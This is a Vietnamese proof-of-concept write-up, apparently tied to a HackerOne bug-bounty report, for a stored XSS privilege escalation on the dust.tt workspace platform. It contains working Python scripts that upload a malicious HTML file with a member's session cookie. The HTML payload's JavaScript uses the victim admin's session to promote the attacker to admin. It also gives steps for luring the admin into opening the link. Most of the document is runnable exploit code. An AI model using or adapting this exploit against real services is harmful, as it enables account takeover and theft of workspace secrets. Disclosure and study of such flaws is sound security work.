# https://hackerone.com/reports/3115705

---

## 1. Thiết lập môi trường

1. Bạn là **Admin** của một workspace (ví dụ `workspace123`).
2. Mời thêm một **Member** giả lập (ví dụ `member@example.com`).

---

## 2. Tải lên file HTML độc hại

Dùng session token của `member@example.com` để upload file HTML có chứa payload XSS.

### 2.1 Lấy `uploadUrl`

```python
import requests

cookie = {'appSession': '<SESSION_MEMBER>'}
json_data = {
    'contentType': 'text/html',
    'fileName':     'xss_poc.html',
    'fileSize':      2048,
    'useCase':       'conversation'
}

resp = requests.post(
    'https://dust.tt/api/w/workspace123/files',
    cookies=cookie,
    json=json_data
)
upload_url = resp.json()['file']['uploadUrl']
print('[*] Upload URL:', upload_url)
```

### 2.2 Upload tập tin HTML

```python
from requests_toolbelt.multipart.encoder import MultipartEncoder

cookie = {'appSession': '<SESSION_MEMBER>'}
m = MultipartEncoder(fields={
    'file': (
        'xss_poc.html',
        open('xss_poc.html','rb'),
        'text/html'
    )
})
headers = {
    'Content-Type': m.content_type,
    'Origin':       'https://dust.tt',
    'Referer':      'https://dust.tt/w/workspace123/assistant/new'
}

resp = requests.post(
    upload_url,
    cookies=cookie,
    headers=headers,
    data=m
)
download_url = resp.json()['file']['downloadUrl']
print('[*] Shareable URL:', download_url + '?action=view')
```

Nội dung file `xss_poc.html` ví dụ:

```html
<!doctype html><html><head><meta charset="utf-8"></head><body>
<script>
  // Khi admin mở, script này chạy
  fetch('https://dust.tt/api/user', { credentials:'include' })
    .then(r=>r.json())
    .then(data=>{
      const ws = data.user.workspaces[0].sId;
      const attackerId = '<ATTACKER_USER_ID>';
      // Thăng quyền attacker lên Admin
      fetch(`https://dust.tt/api/w/${ws}/members/${attackerId}`, {
        method:'POST',
        headers:{ 'Content-Type':'application/json','x-commit-hash':'41c0391' },
        credentials:'include',
        body: JSON.stringify({ role:'admin' })
      });
      alert('✔️ Đã PWNED workspace!');
    });
</script>
<h1>Loading…</h1>
</body></html>
```

---

## 3. Lấy link và lừa Admin mở

* Gửi link `https://dust.tt/api/files/<fileId>?action=view` cho Admin.
* Khi Admin click, trang HTML tự động thực thi script trên **trong ngữ cảnh phiên của Admin**.

---

## 4. Kết quả PWN

* `attacker@example.com` (Member) được thăng thành **Admin**.
* Kẻ tấn công có thể hạ cấp, xóa các Admin hợp lệ, đọc/xóa secrets, kiểm soát hoàn toàn workspace.

---

